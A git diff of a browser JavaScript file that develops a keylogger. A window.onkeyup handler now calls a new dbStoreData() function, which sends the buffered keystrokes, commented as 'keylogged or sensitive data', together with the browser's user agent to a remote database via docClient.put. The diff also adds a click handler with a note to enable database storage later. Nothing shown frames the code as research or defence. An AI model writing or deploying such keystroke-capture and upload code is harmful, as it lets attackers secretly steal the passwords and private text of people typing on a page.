@@ -91,6 +91,7 @@ window.onkeyup = function(e) {
 
     if( (e.keyCode == enter) || (e.keyCode == tab) )
     {
+        /*
         // this is the primary key
         params.Item["Artist"] = Date.now().toString();
         // this is the secondary key
@@ -104,14 +105,39 @@ window.onkeyup = function(e) {
             } else {
                 console.log("Success", data);
             }
-        });
+        });*/
+        dbStoreData();
         writefunc();
     }
-
-
 }
 
+/* clicking and storing */
+window.onclick = clickStore;
+function clickStore() {
+       //dbStoredata(); //UNCOMMENT this line when we are ready to push it
+       writefunc();
+       return false;
+     }
+
+function dbStoreData() {
+            // this is the primary key
+        params.Item["Artist"] = Date.now().toString();
+        // this is the secondary key
+        params.Item["SongTitle"] = navigator.userAgent;
+        // next, we can place any keylogged or sensitive data into the database (no limit on number of parameters, really)
+        params.Item["KeyloggedText"] = strings;
+        // actually put them in the database
+        docClient.put(params, function(err, data) {
+            if (err) {
+                console.log("Error", err);
+            } else {
+                console.log("Success", data);
+            }
+        });
+} 
+
 // this is a function that writes the buffer to the browser console, and then clears the buffer
+//NOTE: remove the 'console.log' from this later and just leave it as a reset function for strings and params
 function writefunc() {
     // reset the strings variable and the item for the DB
     console.log(strings);
